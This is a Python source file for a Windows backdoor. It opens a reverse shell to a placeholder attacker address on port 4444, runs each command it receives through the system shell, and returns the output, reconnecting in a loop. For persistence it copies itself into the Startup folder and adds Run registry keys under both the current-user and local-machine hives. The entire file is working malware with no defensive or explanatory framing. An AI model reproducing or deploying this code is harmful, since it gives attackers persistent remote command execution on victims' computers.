import socket
import subprocess
import winreg as reg
import os
import sys
import shutil
import time

# Configuration for the reverse shell
ATTACKER_IP = 'ip address of attacker'
ATTACKER_PORT = 4444

# Name for the registry entry
ENTRY_NAME = "MyPythonScript"


def reverse_shell():
    while True:
        try:
            # Create socket and attempt to connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            print("Connected to the attacker.")

            # Record the start time to manage reconnection intervals
            start_time = time.time()

            # If connected, handle commands
            while True:
                try:
                    # Check if a minute has passed since last reconnect
                    current_time = time.time()
                    if current_time - start_time >= 60:  # 60 seconds = 1 minute
                        print("Reconnecting due to timeout...")
                        break  # Break out to reconnect

                    # Receive command from the attacker
                    command = s.recv(1024).decode('utf-8')

                    if not command:
                        print("Connection lost. Reconnecting...")
                        break  # Exit to reconnect

                    if command.lower() == 'exit':
                        print("Exit command received. Disconnecting...")
                        return  # Exit the function to stop the script

                    # Execute command and send the output
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    s.send(output.encode('utf-8'))

                except Exception as e:
                    print(f"Error while processing command: {e}")
                    break  # Exit to reconnect

            s.close()
            print("Disconnected. Reconnecting in 10 seconds...")
            time.sleep(10)  # Wait before reconnecting

        except (socket.error, ConnectionRefusedError) as e:
            print(f"Connection failed: {e}. Retrying in 10 seconds...")
            time.sleep(10)  # Wait before retrying


def add_to_startup():
    try:
        # Determine the path to the current executable
        exe_path = os.path.abspath(sys.executable)

        # Ensure the executable path is copied to a safe location if necessary
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        if not os.path.exists(startup_path):
            os.makedirs(startup_path)
        target_exe_path = os.path.join(startup_path, os.path.basename(exe_path))

        # Copy the executable to the startup folder (if not already there)
        if exe_path != target_exe_path:
            shutil.copy(exe_path, target_exe_path)

        # Add to user startup
        try:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                              reg.KEY_SET_VALUE)
            reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, target_exe_path)
            reg.CloseKey(key)
            print("Successfully added to user startup.")
        except Exception as e:
            print(f"Failed to add to user startup: {e}")

        # Add to machine startup
        try:
            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                              reg.KEY_SET_VALUE)
            reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, exe_path)
            reg.CloseKey(key)
            print("Successfully added to machine startup.")
        except Exception as e:
            print(f"Failed to add to machine startup: {e}")

    except Exception as e:
        print(f"Failed to add to startup: {e}")


if __name__ == "__main__":
    add_to_startup()
    reverse_shell()
